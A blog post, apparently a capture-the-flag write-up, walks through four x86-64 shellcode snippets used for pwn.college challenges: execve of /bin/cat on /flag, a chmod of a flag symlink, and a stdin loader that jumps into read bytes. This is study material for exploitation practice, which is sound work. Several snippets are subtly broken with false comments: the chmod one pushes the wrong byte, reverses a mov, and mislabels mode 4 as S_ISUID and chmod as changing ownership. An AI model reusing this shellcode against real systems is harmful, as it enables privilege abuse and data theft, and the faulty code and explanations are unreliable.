# The 4 Types of Shellcode I Used For pwn.college #

I recently completed the pwn.college Shellcode Injection module. I was never
really interested in actually learning how to shellcode because I thought I
could just look up. Since this is the first module, I ended up giving it chance
and really enjoyed the problems.

https://i.imgur.com/iHF8get.png

The 4 Types of Shellcode I used for the challenges were:
1. Pushing strings to the stack, then execve
2. Declaring strings in the shellcode, then execve
3. Using `chmod` to change the flag permissions
4. Using a loader to stage the actual shellcode

These were all assembled in `nasm`. My command looked something like \
```
nasm -f bin exploit.asm
```
The standard way taught in tutorials is to assemble it into an ELF file and then
take out the .text section. The `-f` flag just outputs a flat binary.

These are PoCs and must be substantially modified to actually solve later levels.

### Pushing strings to the stack

```asm
BITS 64
 
_start:
 xor rsi, rsi
 push rsi ; /flag terminator
 mov rsi, 0x67616c662f ; the chars of '/flag' represented as one integer
 push rsi
 mov rsi, rsp ; rsi = &"/flag"
 
 xor rdi, rdi
 push rdi ; /bin/cat terminator
 mov rdi, 0x7461632F6E69622F ; '/bin/cat'
 push rdi
 mov rdi, rsp ; rsp = &"/bin/cat"
 
 xor rdx, rdx
 
 push rdx ; arguments array terminator
 push rsi ; push &"/flag"
 push rdi ; push &"/bin/cat"
 mov rsi, rsp ; rsi = [&"/bin/cat", &"/flag"]
 
 mov rax, 59
 syscall
```

This is the one I started out with. I thought it was cooler than just declaring
bytes. I couldn't get `/bin/sh` to work so I just used `/bin/cat` instead. This
one takes up the most space out of all the shellcode we are reviewing
today.

### Declaring strings in the shellcode

```asm
BITS 64
 
_start:
 mov edi, bin_str
 mov esi, bin_str
 xor rdx, rdx

 push 59
 pop al
 syscall

 bin_str: db "/bin/cat", 0
 flag_str: db "/flag", 0
```

This version is much easier to understand and a little smaller.

### `chmod`ing the Flag

```asm
BITS 64
 
_start:
 push 0x59 ; 'f' 
 mov rsp, rdi ; rdi = &"f"
 mov rsi, 4 ; S_ISUID   

 mov rax, 0x5a ; chmod syscall
 syscall
```

Now we are getting super small. This shellcode requires a little preparation.
You have to create a symlink to the flag in the local directory named `f`. The
syscall changes the ownership of the symlink (which refers to the flag) to the 
user. The symlink does not have to named `f`.

### Loader from stdin

```asm
BITS 64

_start:
 mov rdi, 0 ; fd = 0 (stdin)
 mov rsi, (rwx buffer) ; buf
 mov rdx, 0x100 ; count = 0x100

 mov rax, 0
 syscall
 jmp rsi
```

This can be further minimized (exercise for the reader). One technique for
futher optimization is looking at what is in your registers at the time of
execution. Maybe some registers already have a zero. Maybe you can use `eax`
instead of `rax` to avoid the `REX` prefix.
